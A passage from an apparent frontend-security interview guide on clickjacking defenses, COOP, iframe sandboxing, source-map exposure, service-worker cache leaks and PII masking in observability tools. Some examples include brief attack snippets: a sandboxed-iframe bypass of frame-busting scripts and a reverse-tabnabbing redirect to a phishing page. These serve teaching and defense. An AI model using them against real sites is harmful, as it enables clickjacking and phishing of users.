  • For genuinely sensitive actions (payment authorization, granting a permission), require a confirmation step that's difficult to trigger via a single opportunistic click — e.g. a short deliberate hold, a re-entered value, or a visible state change the user must observe and react to, rather than a single button that fires the sensitive action immediately.
  • Avoid rendering the most sensitive action as the very first/only interactive element — an attacker positioning bait needs a predictable target; adding a preceding, visible step disrupts naive overlay attacks.
  • Consider requiring the widget's iframe to be a minimum visible size/opacity threshold enforced by your own script (detecting if you're rendered unusually small or the parent page appears to be manipulating your visibility) as an additional heuristic signal, understanding it's not airtight on its own.

Communicate the trust boundary to partners

Document clearly for embedding partners what your widget expects from them (not overlaying content on top of it, not manipulating its CSS/visibility) as part of the integration agreement — this doesn't stop a malicious embedder, but it does set an enforceable expectation for legitimate ones and clarifies liability.

Code Example

// Allow-list specific partners rather than leaving framing wide open:
Content-Security-Policy: frame-ancestors 'self' https://partner-a.example.com https://partner-b.example.com

// For a high-value action inside the widget, avoid a single-click-fires-it
// design; require a deliberate secondary confirmation the widget itself renders,
// which a naive overlay/opacity-based clickjack is far less likely to survive:
function ConfirmPayment({ onConfirm }) {
  const [held, setHeld] = useState(false);
  return (
    <button
      onMouseDown={() => setHeld(true)}
      onMouseUp={() => { if (held) onConfirm(); setHeld(false); }}
      onMouseLeave={() => setHeld(false)}
    >
      Hold to confirm payment
    </button>
  );
}

// A lightweight, non-airtight heuristic: detect unusually small/hidden framing.
if (window.self !== window.top) {
  const rect = document.documentElement.getBoundingClientRect();
  if (rect.width < MIN_EXPECTED_WIDTH) {
    renderWarningInsteadOfSensitiveAction();
  }
}

Project Example

A payments widget needed to remain embeddable across dozens of e-commerce partner sites, ruling out a blanket frame-ancestors 'none'. The team allow-listed each partner's exact domain, and redesigned the final "authorize payment" step to require a deliberate hold-to-confirm gesture rather than a single click, specifically because a single-click "Pay Now" button is the exact shape a clickjacking overlay attack targets most easily. A subsequent third-party security assessment noted the hold-to-confirm pattern as a meaningful mitigation for the class of widget-embedding risk the business model required them to accept.

Senior Engineer Perspective

This question tests whether a candidate can reason about a security trade-off imposed by a genuine business requirement (must be embeddable) rather than defaulting to the simplest textbook answer (block all framing). The senior answer accepts the constraint, narrows the trust boundary as much as the requirement allows (partner allow-list, not open framing), and adds interaction-level friction specifically calibrated to defeat the attack pattern that framing headers alone can no longer fully prevent once framing itself must be permitted.

Q67. How does the Cross-Origin-Opener-Policy (COOP) header relate to clickjacking and framing protections?

ROI: ★★★ Frequency: Low-Medium

Short Answer

COOP addresses a different, related problem: it controls whether your page shares a browsing-context group (and therefore a synchronous window reference) with a page that opened it via window.open() or a link — same-origin isolates your page into its own process/context group, severing the opener's ability to reach into it via window.opener. It's not a framing/clickjacking control by itself (that's frame-ancestors/X-Frame-Options's job), but it closes a related cross-window attack surface — a malicious page that opened yours in a new tab/window reaching back into it — and is part of the same general "who can interact with my page from another browsing context" family of defenses.

Detailed Answer

The specific attack COOP addresses

Without COOP, if page A opens page B via window.open() or a plain link, page B can, in many cases, reach back and manipulate page A via window.opener — historically used for phishing (a malicious opener page rewrites itself once the legitimate page it opened is out of focus, a "tabnabbing" attack) or to probe/interfere with the opened page's state. Setting Cross-Origin-Opener-Policy: same-origin puts your page in its own browsing-context group, breaking that window.opener reference for cross-origin openers.

How this differs from frame-ancestors

HeaderControls
frame-ancestors / X-Frame-OptionsWhether another page may frame (embed) yours at all.
Cross-Origin-Opener-PolicyWhether a page that opened yours (via window.open/link) retains a live reference into your window.

They're complementary, not substitutes — a fully hardened page typically sets both, since they close different cross-window attack surfaces.

COOP's other major benefit: cross-origin isolation

Paired with Cross-Origin-Embedder-Policy, COOP enables "cross-origin isolation," which unlocks certain powerful, security-sensitive browser APIs (like high-resolution timers needed for some WASM/SharedArrayBuffer use cases) that browsers otherwise restrict due to Spectre-class side-channel risks. If your app needs those APIs, COOP/COEP configuration becomes a functional requirement, not just a defensive nice-to-have.

Code Example

// Without COOP: a malicious opener can reach back into the page it opened.
// (on the MALICIOUS opener page)
const popup = window.open("https://victim-app.com/dashboard");
// ... later, potentially: popup.location = "https://phishing-lookalike.com"
// (classic reverse-tabnabbing pattern, also independently mitigated by
// rel="noopener" on the LINK that opens the new window/tab)

// Server-side defense: isolate your page's browsing context group.
Cross-Origin-Opener-Policy: same-origin

// Complementary, separate concern -- framing protection:
Content-Security-Policy: frame-ancestors 'none'

// A hardened response typically sets both, since they cover different
// cross-window attack surfaces:
Cross-Origin-Opener-Policy: same-origin
Content-Security-Policy: frame-ancestors 'self'

// Also always use rel="noopener" (or rel="noreferrer") on links that open
// new tabs to untrusted destinations, independent of COOP:
<a href="https://external-site.com" target="_blank" rel="noopener noreferrer">link</a>

Project Example

A security review flagged that an app's own outbound links using target="_blank" lacked rel="noopener", meaning any external site the app linked to could, in principle, reach back and manipulate the original tab via window.opener — a classic reverse-tabnabbing risk. Alongside adding rel="noopener" to every such link, the team also set Cross-Origin-Opener-Policy: same-origin as a blanket server-level control, so even a missed link in the future would still be protected against the opener-reference attack by default.

Senior Engineer Perspective

Interviewers use this to check whether a candidate conflates "framing protection" with the broader family of cross-window security headers. The senior answer draws the line clearly: frame-ancestors stops your page from being embedded, COOP stops a page that opened yours from retaining a live handle into it, and rel="noopener" is the equivalent link-level control for outbound navigation — three related but distinct defenses against three distinct cross-window interaction vectors, ideally all present together rather than treated as redundant.

Q68. Are frame-busting JavaScript techniques (top !== self checks) a reliable clickjacking defense on their own?

ROI: ★★★★ Frequency: Medium

Short Answer

No. Classic frame-busting scripts (if (top !== self) { top.location = self.location; }) have a long history of being bypassed and should never be your only or primary defense — use the server-sent frame-ancestors/X-Frame-Options headers instead, which the browser enforces before your page's JavaScript even has a chance to run. Frame-busting is, at best, a legacy fallback for browsers old enough to lack proper header support, which is an increasingly small and low-priority slice of real traffic.

Detailed Answer

Documented bypasses of frame-busting scripts

  • Sandboxed iframe: an attacker frames your page inside <iframe sandbox="allow-scripts"> without allow-top-navigation — your frame-busting script runs but its attempt to navigate top.location is silently blocked by the sandbox restriction, since it lacks permission to navigate the top-level frame; your page stays framed regardless.
  • onbeforeunload abuse: the attacker's page can attach a handler that intercepts/interferes with the navigation your busting script attempts to trigger, showing a confirmation prompt or otherwise disrupting the intended "break out of the frame" behavior.
  • Double-framing / nested frame tricks and various historically documented timing/ordering bypasses specific to how different scripts implemented the check.

Why the header-based approach doesn't share these weaknesses

frame-ancestors/X-Frame-Options are enforced by the browser itself at the network/rendering layer, before your page's HTML is even parsed into a framed document — there's no JavaScript execution for an attacker's sandboxing/event-handler tricks to interfere with. The browser simply refuses to render the framed content at all if the ancestor check fails.

When frame-busting scripts still show up

Occasionally as defense-in-depth alongside headers (belt-and-suspenders for very old browsers, or as a visible signal if headers are somehow stripped by a misconfigured proxy) — but never presented or relied upon as the primary control in a modern stack. If asked to review code that uses a frame-busting script as its only clickjacking defense, that's a finding to flag.

Code Example

// Legacy frame-busting script -- NOT reliable as a primary defense.
if (window.top !== window.self) {
  window.top.location = window.self.location; // attempt to break out
}

// BYPASS: framing the page inside a sandboxed iframe WITHOUT
// allow-top-navigation blocks exactly this navigation attempt, silently.
// (on the attacker's page)
<iframe src="https://victim-app.com/account" sandbox="allow-scripts"></iframe>
// The busting script still runs (allow-scripts permits that), but its
// attempt to set top.location has no effect -- the sandbox forbids it.

// RELIABLE defense: browser-enforced headers, no JS execution involved,
// nothing for a sandbox/event-handler trick to interfere with.
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

Project Example

A legacy internal app relied solely on a frame-busting script written years earlier, with no X-Frame-Options or CSP header at all. A security assessment demonstrated that framing it inside a sandboxed iframe without top-navigation permission completely neutralized the busting script while still fully rendering the framed page, exposing it to clickjacking despite the "protection" the original developers believed was in place. Adding the proper header-based controls fixed it immediately and made the (now redundant) frame-busting script irrelevant to actual security.

Senior Engineer Perspective

This is a good calibration question — someone who confidently says "just use a frame-busting script" is signaling outdated or incomplete security knowledge, since this exact bypass (sandboxed iframe without top-navigation) has been public and well-known for a long time. The senior answer states plainly that header-based enforcement happens at a different, earlier layer than any JavaScript can reach, and that's precisely why it can't be defeated by the same class of trick that reliably breaks script-based defenses.

Q69. What clickjacking-equivalent risks exist for mobile WebView-embedded content, and how do they differ from desktop browser framing?

ROI: ★★★ Frequency: Low-Medium

Short Answer

A native mobile app's WebView can render your web content without any of the browser-level framing protections applying the same way — frame-ancestors/X-Frame-Options govern iframe embedding within a page, but a WebView is a native app hosting your page directly (not framing it inside another web page), and the native app can overlay native UI elements on top of your WebView content, effectively achieving a clickjacking-equivalent result ("tapjacking") entirely outside the web platform's framing-header defenses. This risk is largely outside a web frontend team's direct control and shifts toward "does this native app's own platform sandbox/permissions model prevent overlay abuse," a mobile OS-level concern.

Detailed Answer

Why framing headers don't help here

frame-ancestors is a web-platform concept enforced by browser engines rendering an <iframe> — it has no jurisdiction over how a native Android/iOS app chooses to render, position, or overlay elements around a WebView component hosting your content. If a malicious native app embeds your web page in a WebView and draws a native transparent view on top of it, your web-side headers are simply not part of that equation at all.

Tapjacking, specifically

This is the mobile-native analog of clickjacking: a malicious app overlays a transparent or disguised native UI element on top of another app's (or WebView's) visible content, intercepting taps intended for the underlying content. Mobile OS platforms have introduced their own mitigations over time (e.g. touch-filtering APIs that can reject touches passing through an overlay), but these are platform/OS and native-app-level controls, not something a web page's own code or headers can enforce.

What a web-content provider can still reasonably do

  • If you control both the native app and the WebView content (a hybrid app), apply the platform's own overlay/touch-filtering protections at the native layer — this is a mobile engineering responsibility, but web/frontend teams building hybrid apps should know to ask about it.
  • For payment/credential entry specifically within a WebView you don't fully trust the host app for, prefer the platform's native, OS-mediated secure input mechanisms (a native payment sheet, biometric-gated confirmation) over a purely web-rendered form, since those carry stronger platform-level tapjacking protections than a plain WebView-rendered HTML form.
  • Recognize and document this as a threat that's out of your web-layer control when your content is embedded in a third-party native app's WebView you don't control — analogous to the browser-extension risk discussed earlier, it's a residual risk to accept and communicate, not a bug in your web code.

Code Example

// Your web page's framing headers have NO effect on how a native app's
// WebView chooses to render or overlay content around your page --
// this is entirely outside the web platform's enforcement boundary.
Content-Security-Policy: frame-ancestors 'none'   // no effect against a hostile WebView host

// For a hybrid app YOU control, the actual mitigation lives at the native layer
// (illustrative Android concept -- filter touches that pass through an overlay):
// view.setFilterTouchesWhenObscured(true)

// For sensitive input inside a WebView you don't fully control the host for,
// prefer deferring to the native platform's own secure UI rather than a
// purely web-rendered form:
// -> trigger the OS's native payment sheet / biometric prompt instead of
//    rendering a card-entry form inside the WebView itself.

Project Example

A company's web checkout flow was embedded via WebView inside several third-party "super app" platforms as part of a partnership integration, none of which the company directly controlled the native code for. A security review flagged that the web team's usual clickjacking defenses (CSP frame-ancestors) provided no protection against a hypothetical malicious overlay within one of those host apps' WebViews, and recommended migrating the actual payment-authorization step to the host platform's native payment API where available, rather than relying on the embedded web form for the most sensitive step of the flow.

Senior Engineer Perspective

This question checks whether a candidate understands the boundary of what web-platform security headers can and cannot reach. The senior answer states plainly that framing headers are a web-platform-specific mechanism with no jurisdiction over native WebView hosting, correctly reclassifies this as tapjacking (a native/mobile-OS-level threat), and — most importantly — knows to push the highest-value, most sensitive interactions toward native platform mechanisms when your web content is hosted inside an untrusted native shell you don't fully control.

Q70. How would you actually test whether a page is vulnerable to clickjacking during a security review?

ROI: ★★★★ Frequency: Medium

Short Answer

The fastest check is inspecting the actual response headers for X-Frame-Options/frame-ancestors on every HTML-serving route, since a missing header is the root cause in the overwhelming majority of real findings. Beyond that, build a minimal test harness — a local HTML page that frames the target in an <iframe> — and confirm the browser actually refuses to render it (not just that the header is present in isolation; misconfigurations in intersection with other CSP sources, covered earlier, can silently weaken the effective policy). Then verify the policy is applied consistently across every route, not just the ones the team remembered to check, since a single unprotected page (a login page, an old admin route) undermines the whole effort.

Detailed Answer

A concrete testing checklist

  1. Crawl or enumerate every HTML-serving route (not just the obvious ones — old/legacy/admin/error pages are frequently missed).
  2. For each, check response headers for both X-Frame-Options and frame-ancestors (via CSP) — note that relying on only one leaves older or newer browsers respectively uncovered.
  3. Build a minimal local test harness: an HTML file with <iframe src="https://target-app.com/route">, opened in each major browser, confirming the framed content actually fails to render (a blank frame or browser-level block message) rather than just checking the header value looks correct in isolation.
  4. Check for CSP intersection issues (recall the multiple-CSP-source question earlier) — a route might have the right header value on paper but an edge/CDN layer's separate policy could be narrower or, less commonly, could omit frame-ancestors from an otherwise-present policy in a way that changes the effective result.
  5. For any route that legitimately needs to be embeddable, verify the allow-list is scoped to exactly the intended partner origins, and test that a non-allow-listed origin is genuinely refused (not just assumed to be, based on reading the config).

Common findings in real reviews

  • Headers present on the main app shell but missing on a separately-deployed subdomain (a docs site, a status page, an old marketing microsite) that still handles authenticated sessions or sensitive actions.
  • A policy that was correct at last review but silently weakened by an infrastructure change (a new CDN layer, a migrated reverse proxy) that stopped forwarding the header.
  • Reliance on a frame-busting script alone (covered in the previous question) mistaken for adequate protection.

Code Example

// Quick header check across a route list:
// curl -sI https://app.example.com/dashboard | grep -iE "x-frame-options|content-security-policy"

// Minimal local test harness -- confirms actual browser behavior, not just
// header presence:
<!DOCTYPE html>
<html>
<body>
  <h1>Clickjacking test harness</h1>
  <iframe src="https://target-app.com/account/settings" width="800" height="600"></iframe>
  <!-- open this file locally in each major browser and confirm the iframe
       is genuinely blocked/blank, not just that a header LOOKS correct -->
</body>
</html>

// A CI regression test asserting the header is present on every known route:
test.each(["/login", "/dashboard", "/account/settings", "/admin"])(
  "%s sends frame-ancestors none",
  async (route) => {
    const res = await request(app).get(route);
    expect(res.headers["content-security-policy"]).toMatch(/frame-ancestors 'none'/);
  }
);

A review found that the main application correctly sent frame-ancestors 'none' on every route, but a separately-hosted account-recovery subdomain (deployed via an older pipeline the security team hadn't been tracking) had no framing protection at all and handled a sensitive password-reset confirmation step. Building the actual iframe test harness against every discovered subdomain — rather than trusting the main app's configuration to represent the whole surface — is specifically what surfaced this gap; a header-presence check against only the primary domain would have missed it entirely.

Senior Engineer Perspective

The senior habit interviewers reward is testing actual browser behavior end-to-end rather than trusting a header's presence at face value, and deliberately hunting for the routes/subdomains a team is likely to have forgotten rather than only re-checking the ones already known to be correct. Turning every finding into a permanent CI assertion (as shown above) is the detail that separates a one-time audit from a durable, regression-resistant security posture.

Q71. Should you always send X-Frame-Options: DENY, or are there legitimate reasons to allow some framing?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Not always — DENY/frame-ancestors 'none' is the right default for the strong majority of pages, but it will break anything your product legitimately needs framed: your own in-product preview/embed features, a payment provider's hosted iframe field integration pattern, or a genuinely embeddable widget product. The right approach is choosing the narrowest option that satisfies an actual, specific requirement — SAMEORIGIN/frame-ancestors 'self' if only your own pages need to frame it, or an explicit partner allow-list if specific third parties legitimately need to — rather than either blanket-denying everything or leaving framing wide open by default.

Detailed Answer

Legitimate reasons to allow some framing

  • Your own app frames its own pages for a preview/live-editing feature (SAMEORIGIN covers this cleanly).
  • You are the widget/embed provider, and being framed by partner sites is literally the product (an embeddable calendar, chat, review widget) — see the earlier question on designing such a widget safely.
  • A payment or identity provider requires you to render their hosted field inside your page via an iframe (that's about framing their content inside your page, a different direction than the framing-protection headers cover, but worth distinguishing clearly in a review — frame-src/child-src governs what you may embed, frame-ancestors governs who may embed you).

Why not just default to permissive "to be safe"

Leaving framing open "just in case something needs it later" is backwards from a security standpoint — the default should be maximally restrictive, with framing opened deliberately and narrowly only when a specific, understood requirement demands it, and revisited whenever that requirement changes or disappears.

A decision framework

  1. Default: frame-ancestors 'none' (equivalent to X-Frame-Options: DENY).
  2. If your own pages need to frame this page: frame-ancestors 'self'.
  3. If specific named partners need to frame it: frame-ancestors 'self' https://partner-a.example.com https://partner-b.example.com — enumerate them explicitly, and remove entries when a partnership ends.
  4. Never: leaving it unset (relying on browser defaults, which historically allow framing) or setting an unbounded wildcard-style allowance.

Code Example

// Default for the strong majority of routes/pages:
Content-Security-Policy: frame-ancestors 'none'
X-Frame-Options: DENY

// Only your own app frames itself (e.g. an in-product live preview feature):
Content-Security-Policy: frame-ancestors 'self'
X-Frame-Options: SAMEORIGIN

// You are an embeddable-widget product -- named partners only, reviewed
// and updated deliberately as partnerships change:
Content-Security-Policy: frame-ancestors 'self' https://partner-a.example.com https://partner-b.example.com

// Distinct, different direction: controlling what YOUR page may embed
// (e.g. a payment provider's own hosted field) -- not a framing-protection
// header at all, a separate CSP directive:
Content-Security-Policy: frame-src https://checkout.payment-provider.com

Project Example

A product team wanted an in-app "preview how this looks to your customers" feature that framed one of the app's own pages inside another. Rather than loosening the global policy to something permissive, the team scoped frame-ancestors 'self' specifically to the one route being previewed, keeping every other route at the default 'none' — satisfying the actual requirement without expanding the framing surface anywhere it wasn't needed.

Senior Engineer Perspective

Interviewers use this to see whether a candidate treats security defaults as negotiable based on actual requirements rather than dogma, while still insisting on the narrowest sufficient scope rather than convenience-driven permissiveness. The senior answer also cleanly distinguishes frame-ancestors (who may embed you) from frame-src (what you may embed) — a mix-up that shows up surprisingly often even among engineers who've configured CSP before.

Q72. What sandbox attribute values matter most when you must embed a partially-trusted iframe, and how do they interact with clickjacking risk?

ROI: ★★★★ Frequency: Medium

Short Answer

The sandbox attribute on an <iframe> you embed restricts what the framed content can do, which is a different direction from frame-ancestors (which restricts who may frame you) — but the two interact around clickjacking-adjacent risk in one specific way: allow-top-navigation and its variants let the framed content navigate the top-level page, which is exactly the capability a malicious framed widget could abuse to redirect a victim after luring a click, so it should only ever be granted to content you fully trust, never to arbitrary/partially-trusted embedded content.

Detailed Answer

The sandbox values most relevant to this risk

  • allow-top-navigation / allow-top-navigation-by-user-activation: lets the iframe navigate the top-level browsing context. Granting this to untrusted content lets it redirect the entire page the user is looking at — a phishing/redirect vector that compounds with clickjacking-style luring (bait the click, then navigate the whole page to a convincing fake).
  • allow-popups: lets the framed content open new windows/tabs — combined with a lack of rel="noopener"-equivalent isolation, this can be abused for pop-up-based phishing launched from inside content you embedded.
  • allow-same-origin combined with allow-scripts: as covered in the file-upload/iframe-sandboxing material earlier in this chapter, this combination is effectively no sandbox at all for content sharing your origin — never grant both to untrusted content.
  • allow-forms: lets the framed content submit forms — relevant if the embedded content could be tricked into submitting somewhere unintended.

Why this matters for your own clickjacking posture specifically

If you embed a partially-trusted third-party iframe within your own page, and that iframe is later compromised or was always subtly malicious, an overly permissive sandbox configuration gives it capabilities (top-navigation, popups) that can turn a contained annoyance into a full page-hijack or phishing launch pad — the sandbox attribute is your control over the blast radius of embedding something you don't fully trust, independent of whatever protections you've set up to control who embeds you.

A practical default

Start from a bare sandbox (maximum restriction, nothing granted) and add back only the exact capabilities the specific integration requires, documenting why each one is needed — never copy a permissive sandbox value list from a different integration "because it worked there."

Code Example

// DANGEROUS for partially-trusted content: grants navigation + popup
// capability an untrusted widget could abuse for a redirect/phishing chain.
<iframe src="https://widget.example.com/embed"
  sandbox="allow-scripts allow-same-origin allow-top-navigation allow-popups">
</iframe>

// SAFER: start minimal, grant only what's actually needed, never combine
// allow-scripts with allow-same-origin for content you don't fully trust,
// and never grant top-navigation to partially-trusted content at all.
<iframe src="https://widget.example.com/embed" sandbox="allow-scripts allow-forms">
</iframe>

// If the widget genuinely needs to trigger a top-level navigation (e.g. a
// completed-checkout redirect), prefer having it postMessage a request to
// YOUR page, which then performs the navigation itself after validation --
// rather than granting the iframe direct top-navigation capability:
window.addEventListener("message", (e) => {
  if (e.origin !== "https://widget.example.com") return;
  if (e.data.type === "REQUEST_REDIRECT" && isKnownSafePath(e.data.path)) {
    window.location.href = e.data.path; // YOUR code validates and performs it
  }
});

Project Example

A checkout page embedded a third-party fraud-detection widget with allow-top-navigation granted, originally added to let the widget redirect to a "verification required" page when needed. A security review pointed out that this same capability meant a compromised or misbehaving widget could redirect the entire checkout page anywhere, including a convincing phishing lookalike, entirely independent of the site's own navigation logic. The team replaced the direct top-navigation grant with a postMessage-based request pattern, where the widget asks the host page to navigate and the host page validates the destination before doing so itself — preserving the needed functionality while removing the widget's direct navigation capability.

Senior Engineer Perspective

The senior point to connect explicitly: clickjacking defenses (frame-ancestors) protect your page from being framed maliciously, while sandbox attribute choices protect your page from content you chose to embed misbehaving — two different trust directions that both belong in a complete review of any page involving iframes. Flagging allow-top-navigation specifically as something that should almost never be granted to less-than-fully-trusted content, and proposing the postMessage-mediated alternative, is exactly the kind of concrete, actionable finding a senior review is expected to produce rather than a vague "sandbox everything" recommendation.

Q73. Why is shipping production source maps a security risk, and how should you handle them instead?

ROI: ★★★★ Frequency: High

Short Answer

A source map reverses minification, handing anyone who requests it your original, human-readable source code — variable names, file structure, comments, and sometimes logic that was never meant to be publicly legible (internal API paths, feature-flag names, business logic you'd rather competitors not study line by line). Publicly serving production source maps effectively un-minifies your entire frontend for anyone who looks; the fix is to either not generate them for production, or generate them but upload them privately only to your error-tracking tool rather than serving them publicly alongside the bundle.

Detailed Answer

What's actually exposed

Beyond the obvious readability improvement for reverse-engineering your app's logic, source maps can inadvertently reveal: internal endpoint names and API shapes not otherwise documented publicly, feature flags and unreleased-feature code paths still present but gated off, comments containing internal context ("TODO: remove before this goes to the EU region, compliance issue"), and occasionally hardcoded values a developer assumed were "hidden" by minification alone.

The common accidental-exposure pattern

Many build tools generate .js.map files by default and place them right next to the bundle in the same publicly-served output directory — "just working" without anyone deciding it should. Unless a team explicitly configures source-map handling, this default frequently ships to production unnoticed, discoverable simply by requesting bundle.js.map directly or via the //# sourceMappingURL comment at the end of the bundle pointing right at it.

The correct pattern

  • Generate source maps for production builds (you still want readable stack traces for your own debugging and error tracking) but do not serve them from your public web server/CDN.
  • Upload them privately, directly to your error-tracking tool (Sentry and similar support this as a build step), which uses them server-side to de-minify stack traces in your dashboard without ever exposing the map file publicly.
  • If you must serve them for some legacy reason, gate access behind authentication or restrict by IP/referrer — though the cleaner architectural fix is simply never serving them publicly at all.
  • Double-check your CDN/server config doesn't serve *.map files by a wildcard static-file rule that nobody explicitly reviewed.

Code Example

// A publicly-requestable source map instantly reverses minification:
// GET https://app.example.com/static/js/main.a1b2c3.js.map
// -> readable original variable names, file structure, comments, logic.

// The bundle itself points right at it via a trailing comment:
//# sourceMappingURL=main.a1b2c3.js.map

// FIX 1: generate maps, but exclude them from the deployed/served output --
// upload them privately to your error tracker instead (Sentry CLI example):
// sentry-cli sourcemaps upload --release=$VERSION ./build/static/js
// then DELETE the .map files before deploying the static assets themselves,
// or configure your build to output them to a separate, non-served directory.

// FIX 2 (Vite config concept): generate maps for internal use, hide the
// public reference in production:
// build: { sourcemap: "hidden" }  // map file is generated but bundle omits
                                    // the sourceMappingURL comment pointing to it

Project Example

A competitor-intelligence report surfaced internal feature names and an unreleased pricing-tier structure that a company had never publicly announced — traced back to a fully readable source map the team hadn't realized their default CRA build configuration was serving publicly in production. Reconfiguring the build to generate maps privately for the error-tracking upload step only, and removing the public .map files from the deployed output, closed the leak; the team also added a CI check asserting no .map file appeared in the final deployable artifact.

Senior Engineer Perspective

The senior framing: this is almost always a default-configuration accident, not a deliberate choice, which is exactly why it's worth explicitly checking in any security review rather than assuming a team "obviously" wouldn't ship this. A good candidate mentions the specific workflow of uploading maps privately to an error tracker as the way to keep readable stack traces for debugging without the public-exposure trade-off — showing this isn't "never generate source maps," it's "never serve them publicly."

Q74. How can a service worker's cache accidentally leak sensitive data across users or sessions on a shared device?

ROI: ★★★★ Frequency: Medium

Short Answer

A service worker's Cache Storage persists responses across page loads and, unless deliberately cleared, across logout/login and user switches on the same browser profile — if a caching strategy stores API responses containing one user's personal data, and the cache isn't cleared on logout, the next person to log in on that same device/browser can potentially be served the previous user's cached, sensitive data from the cache before (or instead of) a fresh network response, especially with cache-first or stale-while-revalidate strategies applied indiscriminately to authenticated endpoints.

Detailed Answer

Why this is easy to miss

Service worker caching strategies are usually designed and tested against "does this make the app faster/work offline," with correctness/UX as the lens — the cross-user data-leakage angle on a shared or public device is a different threat model that's easy to overlook entirely if the team building the offline experience isn't the same team thinking about auth/session boundaries.

The specific failure pattern

  1. User A logs in; a cache-first or stale-while-revalidate strategy caches responses from an authenticated endpoint (e.g. /api/profile) keyed by URL, not by user.
  2. User A logs out; the app clears in-memory/localStorage auth state but never touches the Cache Storage.
  3. User B logs in on the same browser; a request to the same URL (/api/profile) is served from the stale cache before/instead of hitting the network — momentarily or, in a buggy offline-first implementation, persistently showing User A's cached data to User B.

Defenses

  • Explicitly clear relevant caches (caches.delete(cacheName) or a targeted cache-entry purge) as part of your logout flow, not just clearing tokens/session state.
  • Never apply a cache-first strategy to authenticated, user-specific API responses by default — reserve aggressive caching for genuinely static/shared/non-sensitive resources, and use network-first or no-cache for anything personal.
  • If you must cache personalized data for offline support, key the cache (or a wrapping check) by user/session identity, and purge on any identity change, not just full logout.
  • Audit your service worker's fetch-handling logic specifically for which routes it intercepts and caches — a broad catch-all handler is the most common source of this bug.

Code Example

// DANGEROUS: a broad cache-first strategy applied to an authenticated,
// personalized endpoint -- keyed by URL only, with no user-awareness.
self.addEventListener("fetch", (event) => {
  event.respondWith(
    caches.match(event.request).then((cached) =>
      cached || fetch(event.request).then((res) => {
        caches.open("api-cache").then((c) => c.put(event.request, res.clone()));
        return res;
      })
    )
  );
  // /api/profile is cached identically regardless of WHICH user's session
  // made the request -- a classic cross-user leak on a shared device.
});

// SAFER: exclude personalized/authenticated endpoints from this strategy,
// and explicitly purge relevant caches on logout.
async function logout() {
  clearAuthState();
  await caches.delete("api-cache"); // don't just clear tokens -- clear cached RESPONSES too
  await fetch("/auth/logout", { method: "POST", credentials: "include" });
}

// And scope the service worker's own caching logic to skip auth-sensitive routes:
self.addEventListener("fetch", (event) => {
  const url = new URL(event.request.url);
  if (url.pathname.startsWith("/api/profile") || url.pathname.startsWith("/api/account")) {
    event.respondWith(fetch(event.request)); // network-only, never cached
    return;
  }
  // ... cache-first for genuinely static/shared assets only
});

Project Example

A field-service app designed for offline use on shared company tablets cached API responses aggressively for offline resilience, including a technician's assigned-jobs list containing customer names and addresses. When a different technician logged in on the same tablet later that day, they briefly saw the previous technician's cached job list before the app's network refresh completed — a real, if brief, cross-user data exposure on a shared device. The fix excluded personalized endpoints from the offline cache entirely (reserving offline support for genuinely shared reference data) and added an explicit cache purge to the logout flow as defense-in-depth.

Senior Engineer Perspective

This question checks whether a candidate thinks about service workers as a persistent-storage security surface, not just a performance/offline feature — a blind spot precisely because caching strategies are usually designed by thinking about speed and resilience, not session boundaries. The senior answer names the concrete failure sequence (login A, cache populated, logout without cache purge, login B on shared device, stale cross-user data served) and treats "clear the cache on logout" as a first-class part of the logout flow, equally important as clearing tokens.

Q75. How do you prevent PII from leaking into client-side error-tracking and session-replay tools?

ROI: ★★★★★ Frequency: High

Short Answer

Error trackers (Sentry) and session-replay tools (FullStory, Hotjar, and similar) both work by capturing rich context about what happened in the browser — which by default often means DOM state, form values, network payloads, and visual playback of the entire screen, all sent to a third-party vendor's servers. Without deliberate configuration, this pipeline routinely captures passwords typed into forms, payment card numbers, health/financial data, and other PII — turning your observability tooling into an accidental, ongoing data-exfiltration channel. The fix is explicit: mask/redact sensitive fields and DOM regions by default, and audit third-party tool defaults rather than trusting them.

Detailed Answer

Why default capture behavior is often unsafe

Session-replay tools reconstruct a visual recording of the user's screen and interactions by capturing DOM mutations and input events — by default, many of them record everything visible, including form fields, unless specific elements are marked for exclusion. Error trackers similarly capture request/response bodies and local component state at the point of a crash, by default, unless scrubbing rules are configured.

What tends to leak, concretely

  • Password fields (typed but not yet submitted, or briefly visible before masking) captured in a session replay recording.
  • Full card numbers/CVVs typed into a non-PCI-isolated form field, visually replayed or captured in an error report's DOM snapshot.
  • Auth tokens/session identifiers present in request headers or URL query strings captured as part of an error's network context.
  • Free-text fields (support messages, medical/financial forms) containing PII, captured verbatim in both replay recordings and error breadcrumbs.

Concrete mitigations

  • Mark sensitive DOM regions/inputs explicitly for exclusion using the tool's masking API (most mature session-replay tools support a data-attribute or class-based opt-out) — and default to masking-everything with explicit opt-in for known-safe fields, rather than the reverse.
  • Configure error-tracker beforeSend/scrubbing hooks (as covered in the earlier error-handling question) to redact known-sensitive header/field names before anything leaves the browser.
  • For genuinely high-sensitivity input (payment, SSN, health data), isolate it into a provider-hosted iframe (recall the browser-extension question's payment-field pattern) — content inside a cross-origin iframe is typically outside what a same-page replay/error tool's DOM capture can see at all, providing structural rather than configuration-dependent protection.
  • Treat every new third-party observability tool as requiring the same data-flow review as any other vendor integration before enabling it broadly.

Code Example

// Session-replay tool: explicitly mask sensitive fields/regions rather than
// trusting broad default capture (illustrative masking API pattern):
<input type="password" data-hj-suppress />             <!-- Hotjar-style suppression -->
<div className="fs-exclude">{cardNumberField}</div>     <!-- FullStory-style exclusion class -->

// Prefer masking by DEFAULT for an entire sensitive section, opting IN
// specific known-safe fields, rather than the reverse:
<form data-hj-suppress>   <!-- whole payment form masked by default -->
  <input name="promoCode" data-hj-allow />  <!-- explicitly opted back in as safe -->
</form>

// Error tracker scrubbing (same pattern as the earlier error-handling question,
// applied specifically to PII-shaped fields this time):
Sentry.init({
  beforeSend(event) {
    for (const field of ["ssn", "cardNumber", "cvv", "password"]) {
      if (event.request?.data?.[field]) event.request.data[field] = "[redacted]";
    }
    return event;
  },
});

Project Example

A healthcare-adjacent product's newly-adopted session-replay tool was found, during a compliance review, to have been capturing full replay recordings of a symptom-intake form for months, including free-text descriptions of sensitive medical information, with no field-level exclusion configured — an unintended PHI exposure to a third-party vendor with no legal basis for that specific data category under the applicable healthcare privacy framework. The remediation masked the entire intake form by default (opting back in only clearly non-sensitive fields like appointment date), and the incident triggered a broader policy requiring explicit data-flow sign-off before any new client-side observability tool could be enabled in production.

Senior Engineer Perspective

